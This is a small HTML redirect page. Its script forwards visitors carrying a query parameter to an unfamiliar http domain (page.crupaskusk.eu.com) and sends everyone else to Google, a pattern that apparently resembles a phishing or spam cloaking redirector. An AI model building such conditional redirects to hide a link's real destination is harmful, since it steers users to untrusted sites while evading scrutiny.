<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    (function() {
      // Extract the path from the current URL
      const path = window.location.search.replace("?q","");

      if(!path) {
         window.location.replace("https://google.com/");
      }
      // Define the new base domain
      const newDomain = 'http://page.crupaskusk.eu.com/';
      // Redirect
      window.location.replace(newDomain + path);
    })();
  </script>
</head>
<body>
  <p>Redirecting to <span id="redirectUrl">new location</span>...</p>
</body>
</html>
